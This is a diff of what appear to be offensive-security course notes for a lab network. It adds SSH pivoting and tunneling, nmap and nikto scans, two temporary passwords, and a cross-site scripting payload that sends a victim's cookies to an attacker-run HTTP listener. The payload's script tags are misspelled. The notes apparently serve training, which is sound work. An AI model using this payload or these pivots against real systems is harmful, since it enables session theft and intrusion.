@@ -39,6 +39,7 @@ for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &);done
 (on lin-ops) ssh -S /tmp/gray gray -O forward -D 9050
 (on lin-ops new tunnel goes through gray host)ssh -S /tmp/gray gray -O forward -L 41900:192.168.28.111:80
 ssh -S /tmp/gray gray -O forward -L 41901:192.168.28.111:22
+
 ssh -MS /tmp/comrade comrade@27.0.0.1 -p 41901
 
 proxychains nmap -v -sT -Pn -T4 --script=http-enum.nse 192.168.28.111 -p 80
@@ -62,20 +63,34 @@ Known URL: consulting.site.donovia
 Known URL: conference.site.donovia
 Action: Reconnaissance to collect intelligence and identify possible avenues of approach in the network.
 
+Temp Passes:
 
+houseBeatFliesLOW
+YourTempPassword
 
+##DAY 2 Web Exploitation
 
+HTTP Response Codes
+    10X == Informational
+    2XX == Success
+    30X == Redirection
+    4XX == Client Error
+    5XX == Server Error
+https://tools.ietf.org/html/rfc2616
 
+HTTP Fields
+    User-Agent
+    Referer
+    Cookie
+    Date
+    Server
+    Set-Cookie
+Demos:
+nmap --script http-enum.nse 10.50.45.126 -p80
+nikto -host 10.50.45.126
 
-
-
-
-
-
-
-
-
-
+python3 -m http.server
+<scrit>document.location="http://10.50.21.11:8000/"+document.cookie;<script
 
 
 
